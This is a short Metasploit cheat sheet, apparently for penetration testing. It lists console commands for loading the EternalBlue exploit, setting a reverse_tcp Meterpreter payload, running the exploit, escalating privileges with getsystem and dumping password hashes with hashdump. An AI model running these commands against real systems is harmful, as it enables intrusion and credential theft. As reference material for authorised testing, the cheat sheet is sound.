# Metasploit Essential Commands & Cheat Sheet

## Starting Up
- **Start PostgreSQL database:** `sudo systemctl start postgresql`
- **Initialize Metasploit database:** `sudo msfdb init`
- **Launch Metasploit Console:** `msfconsole`

## Core Database Commands
- **Check DB Status:** `db_status`
- **Import Nmap Scan:** `db_import /path/to/nmap_scan.xml`
- **List Hosts:** `hosts`
- **List Services:** `services`
- **List Vulnerabilities:** `vulns`

## Searching & Using Modules
- **Search for a module:** `search type:exploit platform:windows <keyword>` (e.g., `search ms17_010`)
- **Select a module:** `use <module_path>` (e.g., `use exploit/windows/smb/ms17_010_eternalblue`)
- **Show module details:** `info`
- **Show available payloads:** `show payloads`

## Configuring Modules
- **Show options:** `show options` or `options`
- **Set a specific option:** `set <OPTION_NAME> <value>` (e.g., `set RHOSTS 192.168.1.50`)
- **Set a global option:** `setg RHOSTS 192.168.1.50` (persists across modules)
- **Unset an option:** `unset <OPTION_NAME>`
- **Set the payload:** `set payload <payload_path>` (e.g., `set payload windows/x64/meterpreter/reverse_tcp`)

## Execution
- **Check if target is vulnerable (if supported):** `check`
- **Execute the exploit:** `exploit` or `run`
- **Run exploit in background:** `exploit -j`

## Meterpreter Basics (Post-Exploitation)
- **Help menu:** `help`
- **System Information:** `sysinfo`
- **Get current user:** `getuid`
- **Elevate privileges:** `getsystem`
- **Dump password hashes:** `hashdump`
- **Drop to a system shell:** `shell`
- **Background the session:** `background` or `Ctrl + Z`
- **List active sessions:** `sessions`
- **Interact with a session:** `sessions -i <session_id>`
